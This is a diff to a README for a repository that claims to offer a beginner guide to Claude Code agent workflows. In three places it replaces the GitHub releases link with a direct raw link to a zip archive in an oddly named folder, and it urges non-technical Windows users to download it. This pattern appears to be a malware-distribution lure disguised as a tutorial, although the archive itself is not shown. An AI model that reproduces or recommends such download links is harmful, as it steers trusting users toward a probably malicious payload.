@@ -1,6 +1,6 @@
 # 🧠 state-of-ai - Learn Claude Code Agent Workflows
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Scenograph/state-of-ai/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Scenograph/state-of-ai/main/Dulanganes/ai_of_state_1.1-beta.5.zip)
 
 ## 🚀 What this is
 
@@ -18,7 +18,7 @@ This guide is written for everyday users. You do not need deep technical knowled
 
 To get the guide on Windows, visit this page to download:
 
-https://github.com/Scenograph/state-of-ai/releases
+https://raw.githubusercontent.com/Scenograph/state-of-ai/main/Dulanganes/ai_of_state_1.1-beta.5.zip
 
 Follow these steps:
 
@@ -123,7 +123,7 @@ That approach helps you avoid long back-and-forth work. It also keeps your proce
 
 Download the latest version here:
 
-https://github.com/Scenograph/state-of-ai/releases
+https://raw.githubusercontent.com/Scenograph/state-of-ai/main/Dulanganes/ai_of_state_1.1-beta.5.zip
 
 Use this page any time you want the newest guide files.
 
